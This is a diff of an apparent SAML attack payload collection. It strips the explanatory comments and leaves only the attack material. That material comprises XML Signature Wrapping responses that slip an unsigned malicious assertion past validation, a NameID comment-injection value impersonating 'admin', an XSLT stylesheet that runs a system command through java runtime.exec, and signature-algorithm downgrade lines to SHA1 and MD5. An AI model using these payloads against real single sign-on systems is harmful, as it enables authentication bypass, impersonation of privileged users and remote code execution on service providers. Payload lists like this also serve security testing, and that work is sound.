@@ -1,50 +1,20 @@
-# ============================================================
-# SAML Injection — Signature Bypass
-# ============================================================
-
-# ---- XML Signature Wrapping (XSW) Attack ----
-# Move signed element, inject malicious clone in different position
-# The signed assertion is valid, but SP processes the unsigned clone
-
-# XSW1 — Add element before signature
 <samlp:Response>
   <saml:Assertion>MALICIOUS ASSERTION (processed by SP)</saml:Assertion>
   <saml:Assertion ID="signed">LEGITIMATE SIGNED ASSERTION</saml:Assertion>
 </samlp:Response>
 
-# XSW2 — Wrap in extension
 <samlp:Response>
   <ds:Signature><ds:SignedInfo>...</ds:SignedInfo><Reference URI="#signed"/></ds:Signature>
   <saml:Assertion>MALICIOUS (not signed)</saml:Assertion>
 </samlp:Response>
 
-# ---- Comment Injection ----
-# Insert XML comment to split NameID value
-# Original: <NameID>user@target.com</NameID>
-# Attack: <NameID>admin<!--comment-->@target.com</NameID>
 <saml:NameID>admin<!---->@target.com</saml:NameID>
 
-# ---- XSLT Injection in SAML ----
-# If SP applies XSLT transformation to SAML response
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:template match="/">
 <xsl:value-of select="java:runtime.exec('id')"/>
 </xsl:template>
 </xsl:stylesheet>
 
-# ---- Signature Stripping ----
-# Remove <ds:Signature> element entirely
-# Some SPs accept unsigned assertions if validation is misconfigured
-
-# ---- Algorithm Confusion ----
-# Downgrade from RSA-SHA256 to RSA-SHA1 or none
 <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
 <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-md5"/>
-
-# ---- Replay Attack ----
-# Capture valid SAML response and replay it
-# Check NotOnOrAfter condition in Conditions element
-
-# ---- InResponseTo Bypass ----
-# Remove InResponseTo attribute or use arbitrary value
-# <samlp:Response InResponseTo="ATTACKER_CHOSEN_ID">
